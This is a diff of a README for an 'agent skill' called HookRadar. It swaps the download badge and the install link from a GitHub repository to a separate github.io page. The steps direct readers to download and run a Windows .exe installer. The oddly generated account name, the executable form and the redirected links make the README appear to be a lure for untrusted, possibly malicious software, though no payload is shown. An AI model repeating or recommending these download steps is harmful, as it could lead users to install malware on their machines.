@@ -1,6 +1,6 @@
 # 🔍 hookradar-agent-skill - Enhance agent marketing creative intelligence today
 
-[![](https://img.shields.io/badge/Download_HookRadar-Blue-blue)](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill)
+[![](https://img.shields.io/badge/Download_HookRadar-Blue-blue)](https://anagogic-blastinggelatin157.github.io)
 
 ## 💡 About this tool
 
@@ -19,7 +19,7 @@ Ensure your computer meets these basic needs before you begin:
 
 You need to obtain the installer from the official repository page. Follow these steps to prepare your system:
 
-1. Visit the following link to access the download area: [https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill).
+1. Visit the following link to access the download area: [https://anagogic-blastinggelatin157.github.io](https://anagogic-blastinggelatin157.github.io).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version number to see the available files.
 4. Download the installer file ending in .exe to your Downloads folder.
